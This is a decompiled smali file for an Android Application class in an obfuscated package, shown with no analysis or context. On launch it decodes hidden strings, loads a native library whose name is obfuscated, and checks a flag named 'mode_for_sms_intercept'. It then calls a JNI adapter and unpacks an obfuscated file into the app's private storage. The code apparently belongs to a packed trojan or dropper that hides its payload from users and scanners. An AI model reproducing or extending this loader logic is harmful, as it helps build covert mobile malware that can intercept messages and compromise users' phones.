.class public Lcom/c101421042723/ui/MyApplication;
.super Landroid/app/Application;


# static fields
.field public static a:Ljava/lang/String;

.field public static b:Ljava/lang/String;

.field public static c:Ljava/lang/String;

.field private static e:Landroid/content/Context;


# instance fields
.field private d:Ljava/util/HashMap;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const/4 v0, 0x0

    sput-object v0, Lcom/c101421042723/ui/MyApplication;->e:Landroid/content/Context;

    const/16 v0, 0x45

    invoke-static {v0}, Lcom/c101421042723/util/g;->a(I)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Application;-><init>()V

    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    iput-object v0, p0, Lcom/c101421042723/ui/MyApplication;->d:Ljava/util/HashMap;

    return-void
.end method

.method public static a()Landroid/content/Context;
    .locals 1

    sget-object v0, Lcom/c101421042723/ui/MyApplication;->e:Landroid/content/Context;

    return-object v0
.end method


# virtual methods
.method protected finalize()V
    .locals 3

    iget-object v0, p0, Lcom/c101421042723/ui/MyApplication;->d:Ljava/util/HashMap;

    invoke-virtual {v0}, Ljava/util/HashMap;->keySet()Ljava/util/Set;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :cond_0
    :goto_0
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-nez v0, :cond_1

    iget-object v0, p0, Lcom/c101421042723/ui/MyApplication;->d:Ljava/util/HashMap;

    invoke-virtual {v0}, Ljava/util/HashMap;->clear()V

    invoke-super {p0}, Ljava/lang/Object;->finalize()V

    return-void

    :cond_1
    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    iget-object v2, p0, Lcom/c101421042723/ui/MyApplication;->d:Ljava/util/HashMap;

    invoke-virtual {v2, v0}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/graphics/Bitmap;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/graphics/Bitmap;->isRecycled()Z

    move-result v2

    if-nez v2, :cond_0

    invoke-virtual {v0}, Landroid/graphics/Bitmap;->recycle()V

    goto :goto_0
.end method

.method public onCreate()V
    .locals 2

    const/16 v1, 0x4b

    invoke-super {p0}, Landroid/app/Application;->onCreate()V

    sput-object p0, Lcom/c101421042723/ui/MyApplication;->e:Landroid/content/Context;

    invoke-static {}, Lcom/c101421042723/util/h;->s()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/c101421042723/ui/MyApplication;->a:Ljava/lang/String;

    invoke-static {}, Lcom/c101421042723/util/h;->c()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/c101421042723/ui/MyApplication;->b:Ljava/lang/String;

    invoke-static {}, Lcom/c101421042723/util/h;->e()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/c101421042723/ui/MyApplication;->c:Ljava/lang/String;

    sget-boolean v0, Lcom/c101421042723/util/Rc101421042723;->mode_for_sms_intercept:Z

    if-nez v0, :cond_0

    invoke-static {v1}, Lcom/c101421042723/util/g;->a(I)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/c101421042723/util/h;->d(Ljava/lang/String;)V

    invoke-static {v1}, Lcom/c101421042723/util/g;->a(I)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/moon/core/adapter/JNIUtil;->a(Ljava/lang/String;)V

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Lcom/c101421042723/ui/MyApplication;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v1}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v1, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const/16 v1, 0x49

    invoke-static {v1}, Lcom/c101421042723/util/g;->a(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0}, Lcom/c101421042723/ui/MyApplication;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v1}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/c101421042723/util/h;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_0
    return-void
.end method

.method public onLowMemory()V
    .locals 0

    invoke-super {p0}, Landroid/app/Application;->onLowMemory()V

    return-void
.end method

.method public onTerminate()V
    .locals 0

    invoke-super {p0}, Landroid/app/Application;->onTerminate()V

    return-void
.end method
